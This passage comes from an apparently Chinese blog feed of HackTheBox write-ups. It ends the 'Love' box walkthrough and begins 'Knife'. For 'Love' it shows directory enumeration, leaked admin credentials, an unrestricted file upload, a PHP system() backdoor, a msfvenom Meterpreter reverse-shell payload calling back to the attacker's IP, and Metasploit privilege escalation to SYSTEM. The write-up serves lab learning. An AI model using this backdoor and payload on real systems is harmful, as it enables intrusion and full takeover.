302]</span><br><span class="line">/com3                 (Status: 403) [Size: 302]</span><br><span class="line">/com1                 (Status: 403) [Size: 302]</span><br><span class="line">/con                  (Status: 403) [Size: 302]</span><br><span class="line">/dist                 (Status: 301) [Size: 336] [--&gt; http://10.10.10.239/dist/]</span><br><span class="line">/examples             (Status: 503) [Size: 402]</span><br><span class="line">/images               (Status: 301) [Size: 338] [--&gt; http://10.10.10.239/images/]</span><br><span class="line">/Images               (Status: 301) [Size: 338] [--&gt; http://10.10.10.239/Images/]</span><br><span class="line">/includes             (Status: 301) [Size: 340] [--&gt; http://10.10.10.239/includes/]</span><br><span class="line">/index.php            (Status: 200) [Size: 4388]</span><br><span class="line">/licenses             (Status: 403) [Size: 421]</span><br><span class="line">/lpt1                 (Status: 403) [Size: 302]</span><br><span class="line">/lpt2                 (Status: 403) [Size: 302]</span><br><span class="line">/nul                  (Status: 403) [Size: 302]</span><br><span class="line">/phpmyadmin           (Status: 403) [Size: 302]</span><br><span class="line">/plugins              (Status: 301) [Size: 339] [--&gt; http://10.10.10.239/plugins/]</span><br><span class="line">/prn                  (Status: 403) [Size: 302]</span><br><span class="line">/server-status        (Status: 403) [Size: 421]</span><br><span class="line">/server-info          (Status: 403) [Size: 421]</span><br><span class="line">/webalizer            (Status: 403) [Size: 302]</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">2021/08/05 01:49:46 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x05-访问admin目录"><a href="#0x05-访问admin目录" class="headerlink" title="0x05.访问admin目录"></a>0x05.访问admin目录</h2><p><code>这里的admin目录与默认登入框还有些不同</code></p><img src="/2021/08/05/HTB-love/image-20210805135557560.png" class><h2 id="0x06-访问域名staging-love-htb"><a href="#0x06-访问域名staging-love-htb" class="headerlink" title="0x06.访问域名staging.love.htb"></a>0x06.访问域名staging.love.htb</h2><p><code>可以看到这是一个网页爬虫工具，并且有一个demo示例</code></p><img src="/2021/08/05/HTB-love/image-20210805135725119.png" class><img src="/2021/08/05/HTB-love/image-20210805135836932.png" class><p><code>测试80与5000端口</code></p><img src="/2021/08/05/HTB-love/image-20210805140036148.png" class><p><code>在5000端口得到admin口令</code></p><img src="/2021/08/05/HTB-love/image-20210805140147979.png" class><h2 id="0x07-admin登入"><a href="#0x07-admin登入" class="headerlink" title="0x07.admin登入"></a>0x07.admin登入</h2><blockquote><p>user:admin</p><p>pass:@LoveIsInTheAir!!!!</p></blockquote><img src="/2021/08/05/HTB-love/image-20210805140538037.png" class><p><code>手动爬虫，发现可以在photo处上传文件，之后测试，发现文件类型不限制</code></p><img src="/2021/08/05/HTB-love/image-20210805141121416.png" class><p><code>上传kali自带反弹shell但是失败了</code></p><img src="/2021/08/05/HTB-love/image-20210805141504716.png" class><h2 id="0x08-使用Godzilla"><a href="#0x08-使用Godzilla" class="headerlink" title="0x08.使用Godzilla"></a>0x08.使用Godzilla</h2><h3 id="1-首先生成shell"><a href="#1-首先生成shell" class="headerlink" title="1.首先生成shell"></a>1.首先生成shell</h3><img src="/2021/08/05/HTB-love/image-20210805141842273.png" class><img src="/2021/08/05/HTB-love/image-20210805141913586.png" class><img src="/2021/08/05/HTB-love/image-20210805141952344.png" class><h3 id="2-上传"><a href="#2-上传" class="headerlink" title="2.上传"></a>2.上传</h3><img src="/2021/08/05/HTB-love/image-20210805142101197.png" class><img src="/2021/08/05/HTB-love/image-20210805142138490.png" class><h3 id="3-访问get-shell"><a href="#3-访问get-shell" class="headerlink" title="3.访问get shell"></a>3.访问get shell</h3><p><code>Godzilla添加目标</code></p><img src="/2021/08/05/HTB-love/image-20210805142304611.png" class><img src="/2021/08/05/HTB-love/image-20210805142745654.png" class><p><code>这里使用Godzilla反弹meterpreter shell失败了</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:5555 </span><br><span class="line">[*] Sending stage (39282 bytes) to 10.10.10.239</span><br><span class="line">[*]  - Meterpreter session 1 closed.  Reason: Died</span><br><span class="line">[-] Meterpreter session 1 is not valid and will be closed</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x09-使用Behinder"><a href="#0x09-使用Behinder" class="headerlink" title="0x09.使用Behinder"></a>0x09.使用Behinder</h2><p><code>Godzilla反弹shell失败了，这里使用Behinder成功了，但是也不能提权。。。。</code></p><img src="/2021/08/05/HTB-love/image-20210805154044687.png" class><h2 id="0x10-提权"><a href="#0x10-提权" class="headerlink" title="0x10.提权"></a>0x10.提权</h2><p><code>使用msfvenom提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/usr/share/webshells/php]</span><br><span class="line">└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.216 LPORT=6666 -f exe &gt; /root/htb/love/sb.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">                                       </span><br></pre></td></tr></table></figure><p><code>先上传一个可以执行系统命令的小马，再上传sb.exe反弹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_REQUEST[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span></span><br><span class="line">        echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">        $cmd = ($_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">        system($cmd);</span><br><span class="line">        echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">        die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2021/08/05/HTB-love/image-20210805155845897.png" class><img src="/2021/08/05/HTB-love/image-20210805155927060.png" class><p><code>开启msf监听</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.17.216     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     6666             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:6666 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>执行sb.exe</code></p><img src="/2021/08/05/HTB-love/image-20210805160641546.png" class><p><code>得到shell，但是不能提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:6666 </span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.239</span><br><span class="line">[*] Meterpreter session 10 opened (10.10.17.216:6666 -&gt; 10.10.10.239:52612) at 2021-08-05 04:07:09 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: LOVE\Phoebe</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:</span><br><span class="line">[-] Named Pipe Impersonation (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (Dropper/Admin)</span><br><span class="line">[-] Token Duplication (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (RPCSS variant)</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p><code>使用always_install_elevated提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 10...</span><br><span class="line">msf6 exploit(multi/handler) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information         Connection</span><br><span class="line">  --  ----  ----                     -----------         ----------</span><br><span class="line">  10        meterpreter x86/windows  LOVE\Phoebe @ LOVE  10.10.17.216:6666 -&gt; 10.10.10.239:52612 (10.10.10.239)</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/always_install_elevated </span><br><span class="line">[*] Using configured payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; set session 10</span><br><span class="line">session =&gt; 10</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/always_install_elevated):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  10               yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.17.216     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     6666             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:6666 </span><br><span class="line">[*] Uploading the MSI to C:\Users\Phoebe\AppData\Local\Temp\pqfzrkZhtqhj.msi ...</span><br><span class="line">[*] Executing MSI...</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.239</span><br><span class="line">[+] Deleted C:\Users\Phoebe\AppData\Local\Temp\pqfzrkZhtqhj.msi</span><br><span class="line">[*] Meterpreter session 11 opened (10.10.17.216:6666 -&gt; 10.10.10.239:52625) at 2021-08-05 04:10:28 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\WINDOWS\system32</span><br><span class="line">meterpreter &gt; cd /</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\</span><br><span class="line">meterpreter &gt; dir</span><br><span class="line">Listing: C:\</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2015-07-10 07:04:22 -0400  $Recycle.Bin</span><br><span class="line">40777/rwxrwxrwx   0       dir   2021-04-12 16:17:58 -0400  $WinREAgent</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2021-04-12 15:55:58 -0400  Administration</span><br><span class="line">100666/rw-rw-rw-  1       fil   2015-07-10 09:20:06 -0400  BOOTNXT</span><br><span class="line">40777/rwxrwxrwx   0       dir   2015-07-10 08:21:38 -0400  Documents and Settings</span><br><span class="line">0000/---------    0       fif   1969-12-31 19:00:00 -0500  DumpStack.log.tmp</span><br><span class="line">40777/rwxrwxrwx   0       dir   2019-12-07 04:14:52 -0500  PerfLogs</span><br><span class="line">40555/r-xr-xr-x   4096    dir   2019-12-07 04:14:52 -0500  Program Files</span><br><span class="line">40555/r-xr-xr-x   4096    dir   2019-12-07 04:14:52 -0500  Program Files (x86)</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2019-12-07 04:14:52 -0500  ProgramData</span><br><span class="line">40777/rwxrwxrwx   0       dir   2021-04-12 15:18:22 -0400  Recovery</span><br><span class="line">40777/rwxrwxrwx   4096    dir   2021-04-12 15:16:36 -0400  System Volume Information</span><br><span class="line">40555/r-xr-xr-x   4096    dir   2019-12-07 04:03:44 -0500  Users</span><br><span class="line">40777/rwxrwxrwx   16384   dir   2019-12-07 04:03:44 -0500  Windows</span><br><span class="line">100444/r--r--r--  395268  fil   2015-07-10 09:20:06 -0400  bootmgr</span><br><span class="line">0000/---------    0       fif   1969-12-31 19:00:00 -0500  pagefile.sys</span><br><span class="line">0000/---------    0       fif   1969-12-31 19:00:00 -0500  swapfile.sys</span><br><span class="line">40777/rwxrwxrwx   12288   dir   2021-04-12 11:16:48 -0400  xampp</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cd Users</span><br><span class="line">meterpreter &gt; dir</span><br><span class="line">Listing: C:\Users</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2021-04-12 17:06:49 -0400  Administrator</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-07 04:30:39 -0500  All Users</span><br><span class="line">40555/r-xr-xr-x   8192  dir   2019-12-07 04:03:44 -0500  Default</span><br><span class="line">40777/rwxrwxrwx   0     dir   2019-12-07 04:30:39 -0500  Default User</span><br><span class="line">40777/rwxrwxrwx   8192  dir   2021-04-12 17:41:34 -0400  Phoebe</span><br><span class="line">40555/r-xr-xr-x   4096  dir   2019-12-07 04:14:52 -0500  Public</span><br><span class="line">100666/rw-rw-rw-  174   fil   2019-12-07 04:14:54 -0500  desktop.ini</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cd Administrator</span><br><span class="line">meterpreter &gt; dir</span><br><span class="line">Listing: C:\Users\Administrator</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">Mode              Size     Type  Last modified              Name</span><br><span class="line">----              ----     ----  -------------              ----</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:55:12 -0400  3D Objects</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:49 -0400  AppData</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Application Data</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:55:12 -0400  Contacts</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Cookies</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Desktop</span><br><span class="line">40555/r-xr-xr-x   4096     dir   2021-04-12 17:06:49 -0400  Documents</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Downloads</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Favorites</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Links</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Local Settings</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Music</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  My Documents</span><br><span class="line">100666/rw-rw-rw-  1048576  fil   2021-04-12 17:06:49 -0400  NTUSER.DAT</span><br><span class="line">100666/rw-rw-rw-  65536    fil   2021-04-12 17:06:50 -0400  NTUSER.DAT&#123;53b39e88-18c4-11ea-a811-000d3aa4692b&#125;.TM.blf</span><br><span class="line">100666/rw-rw-rw-  524288   fil   2021-04-12 17:06:50 -0400  NTUSER.DAT&#123;53b39e88-18c4-11ea-a811-000d3aa4692b&#125;.TMContainer0000000000</span><br><span class="line">                                                            0000000001.regtrans-ms</span><br><span class="line">100666/rw-rw-rw-  524288   fil   2021-04-12 17:06:50 -0400  NTUSER.DAT&#123;53b39e88-18c4-11ea-a811-000d3aa4692b&#125;.TMContainer0000000000</span><br><span class="line">                                                            0000000002.regtrans-ms</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  NetHood</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 18:00:20 -0400  OneDrive</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Pictures</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  PrintHood</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Recent</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Saved Games</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:55:12 -0400  Searches</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  SendTo</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Start Menu</span><br><span class="line">40777/rwxrwxrwx   0        dir   2021-04-12 17:06:50 -0400  Templates</span><br><span class="line">40555/r-xr-xr-x   0        dir   2021-04-12 17:06:49 -0400  Videos</span><br><span class="line">100666/rw-rw-rw-  316416   fil   2021-04-12 17:06:50 -0400  ntuser.dat.LOG1</span><br><span class="line">100666/rw-rw-rw-  90112    fil   2021-04-12 17:06:50 -0400  ntuser.dat.LOG2</span><br><span class="line">100666/rw-rw-rw-  20       fil   2021-04-12 17:06:50 -0400  ntuser.ini</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cd Desktop</span><br><span class="line">meterpreter &gt; dir</span><br><span class="line">Listing: C:\Users\Administrator\Desktop</span><br><span class="line">=======================================</span><br><span class="line"></span><br><span class="line">Mode              Size  Type  Last modified              Name</span><br><span class="line">----              ----  ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  282   fil   2021-04-12 17:55:12 -0400  desktop.ini</span><br><span class="line">100444/r--r--r--  34    fil   2021-04-13 06:20:17 -0400  root.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; cat root.txt </span><br><span class="line">*************************************</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;img src=&quot;/2021/08/05/HTB-love/image-20210805133747044.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-knife</title>
    <link href="https://lunamoore.github.io/2021/07/29/HTB-knife/"/>
    <id>https://lunamoore.github.io/2021/07/29/HTB-knife/</id>
    <published>2021-07-29T08:31:42.000Z</published>
    <updated>2021-07-29T08:33:52.220Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2021/07/29/HTB-knife/image-20210729150203513.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>只开放了22、80端口</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/knife]</span><br><span class="line">└─# nmap -sC -sV -sT 10.10.10.242 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 02:30 EDT</span><br><span class="line">Nmap scan report for 10.10.10.242</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)</span><br><span class="line">|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)</span><br><span class="line">|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title:  Emergent Medical Idea</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 57.03 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-访问80端口"><a href="#0x02-访问80端口" class="headerlink" title="0x02.访问80端口"></a>0x02.访问80端口</h2><p><code>手动爬虫一波啥也没有发现</code></p><img src="/2021/07/29/HTB-knife/image-20210729150450213.png" class><h2 id="0x03-列一波目录"><a href="#0x03-列一波目录" class="headerlink" title="0x03.列一波目录"></a>0x03.列一波目录</h2><p><code>也是什么也没有</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# gobuster dir -u http://10.10.10.242 -w /usr/share/wordlists/dirb/common.txt                                                                                 1 ⨯</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.10.242</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/07/29 02:50:15 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.hta                 (Status: 403) [Size: 277]</span><br><span class="line">/.htaccess            (Status: 403) [Size: 277]</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 277]</span><br><span class="line">/index.php            (Status: 200) [Size: 5815]</span><br><span class="line">/server-status        (Status: 403) [Size: 277]</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">2021/07/29 02:53:11 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04-web指纹搜集"><a href="#0x04-web指纹搜集" class="headerlink" title="0x04.web指纹搜集"></a>0x04.web指纹搜集</h2><p><code>发现PHP/8.1.0-dev，最近刚爆出一个漏洞</code><span class="exturl" 